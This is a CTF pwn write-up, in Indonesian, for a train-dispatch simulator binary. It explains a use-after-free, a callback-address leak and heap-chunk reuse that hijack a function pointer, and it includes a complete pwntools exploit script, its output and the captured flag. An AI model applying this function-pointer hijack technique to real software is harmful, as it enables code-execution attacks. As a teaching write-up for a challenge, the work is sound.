# Writeup PWN — Train Dispatch Simulator

## Ringkasan

Challenge ini adalah binary service berbasis command-line bertema simulasi dispatch kereta. Goal-nya bukan shell, tapi memanggil fungsi tersembunyi `dispatch_override()`, karena fungsi ini membaca environment variable `FLAG` lalu mencetaknya. Fungsi normal yang biasa dipanggil ketika kereta berangkat adalah `normal_departure()`. Di dalam struct `Route`, terdapat function pointer `depart_cb`, jadi kalau pointer ini bisa dikontrol, eksekusi bisa dialihkan ke `dispatch_override()`.
Bug utamanya adalah **use-after-free**. Saat route di-assign ke train, train menyimpan pointer ke objek `Route`. Namun ketika route di-cancel, objek route akan masuk antrean cleanup dan nanti di-`free`, sementara pointer di `g_trains[train_id].route` tidak ikut dihapus. Akibatnya train masih menyimpan pointer ke heap chunk yang sudah bebas.

## Analisis Program

Struct pentingnya seperti ini:

```c
typedef struct Route {
    char code[24];
    char manifest[64];
    route_callback_t depart_cb;
    int depart_tick;
    int cancelled;
} Route;
```

Ukuran `Route` adalah 104 byte. Field paling penting adalah `depart_cb`, karena field ini akan dipanggil ketika departure diproses.

Program punya command `diag <slot>` yang membocorkan alamat callback route:

```c
printf("Telemetry: depart callback @ %p\n", (void *)g_routes[slot]->depart_cb);
```

Karena route normal selalu memakai `normal_departure`, maka leak ini bisa dipakai untuk mendapatkan alamat `normal_departure` di remote. Dari alamat itu, kita tinggal hitung alamat `dispatch_override` menggunakan offset relatif antar fungsi.

Ada juga command `bulletin`. Command ini menerima input hex sepanjang ukuran `Route`, lalu menyimpannya ke buffer global. Saat tick berikutnya, program melakukan `malloc(sizeof(Route))`, lalu menyalin isi bulletin ke heap chunk baru:

```c
p = malloc(sizeof(Route));
memcpy(p, g_bulletin_packet, sizeof(Route));
```

Ini penting karena jika sebelumnya ada `Route` yang sudah di-`free`, malloc berikutnya dengan ukuran sama kemungkinan besar akan memakai ulang chunk yang sama.
Urutan proses saat `advance` juga sangat membantu:

```text
maintenance -> emergency bulletin -> departures
```

Artinya, dalam satu tick yang sama, route lama bisa di-`free` dulu oleh maintenance, lalu chunk-nya diisi ulang oleh bulletin, kemudian pointer lama yang masih dipegang train akan dipakai untuk memanggil callback.

## Vulnerability

Alur bug-nya:

1. Buat route baru di slot 0.
2. Assign route tersebut ke train 0.
3. Train 0 sekarang menyimpan pointer ke route.
4. Cancel route slot 0.
5. Saat tick berikutnya, route akan di-`free`.
6. Tetapi pointer di train 0 masih menunjuk ke alamat route lama.
7. Bulletin membuat alokasi `Route` baru dengan ukuran sama.
8. Heap allocator memakai ulang chunk yang baru saja di-`free`.
9. Isi fake `Route` dari bulletin menggantikan data lama.
10. Saat departure diproses, program memanggil `route->depart_cb(route)`.
11. Karena `depart_cb` sudah kita isi dengan alamat `dispatch_override`, flag tercetak.

Bagian yang mengeksekusi callback ada di `process_departures()`:

```c
if (route->depart_tick <= g_tick) {
    printf("Departure check: train %d leaving now.\n", i);
    route->depart_cb(route);
    g_trains[i].route = NULL;
}
```

Jadi fake route cukup dibuat dengan `depart_tick <= current_tick` dan `depart_cb = dispatch_override`.

## Leak dan Offset

Di local compile, offset fungsi yang muncul adalah:

```text
dispatch_override = 0x1378
normal_departure  = 0x13d7
delta             = -0x5f
```

Tapi offset ini tidak cocok untuk remote, karena binary remote kemungkinan dicompile dengan setting berbeda. Untungnya `diag` tetap membocorkan alamat `normal_departure`.

Setelah dites, offset remote yang benar adalah:

```text
dispatch_override = normal_departure + 0x20
```

Jadi exploit final memakai leak dari `diag`, lalu menghitung:

```python
target = normal_departure + 0x20
```

## Exploit

Script exploit:

```python
from pwn import *

HOST = "tcp-01kz0x02a8qqc060ym9377c9g6.u-ctf-ctf-7001b39a.urc.tf"
PORT = 443

DELTA = 0x20

io = remote(HOST, PORT, ssl=True, sni=True)

def cmd(x):
    io.sendlineafter(b"dispatch> ", x if isinstance(x, bytes) else x.encode())

# Buat route normal.
cmd("new 0 2 R0")

# Assign ke train 0.
# Setelah ini, train 0 menyimpan pointer ke Route slot 0.
cmd("assign 0 0")

# Leak alamat normal_departure.
cmd("diag 0")
io.recvuntil(b"depart callback @ ")
normal_departure = int(io.recvline().strip(), 16)

dispatch_override = normal_departure + DELTA

log.success(f"normal_departure = {normal_departure:#x}")
log.success(f"dispatch_override = {dispatch_override:#x}")

# Cancel route.
# Route akan di-free pada tick berikutnya, tapi pointer di train masih ada.
cmd("cancel 0")

# Buat fake Route.
# Layout:
# code[24]
# manifest[64]
# depart_cb
# depart_tick
# cancelled
fake  = b"PWN\x00".ljust(24, b"\x00")
fake += b"fake manifest".ljust(64, b"\x00")
fake += p64(dispatch_override)
fake += p32(1)
fake += p32(0)

assert len(fake) == 104

# Queue fake Route sebagai emergency bulletin.
cmd("bulletin")
io.sendlineafter(b"hex chars): ", fake.hex().encode())

# Saat advance:
# 1. maintenance free route lama
# 2. bulletin malloc chunk baru dan mengisi fake Route
# 3. departure memakai pointer lama dari train
# 4. depart_cb terpanggil ke dispatch_override
cmd("advance")

io.interactive()
```

## Hasil

Output penting dari exploit:

```text
normal_departure = 0x64c6116fed00
target = 0x64c6116fed20
-- Tick advanced to 1 --
Maintenance: cleaned slot 0 at tick 1.
Dispatch loaded an emergency route template at 0x64c61c2782a0.
Departure check: train 0 leaving now.
Override accepted for route PWN.
uctf{29ff775643358b3d500b58d410ad4fc46cbd}
```

Flag:

```text
uctf{29ff775643358b3d500b58d410ad4fc46cbd}
```

##
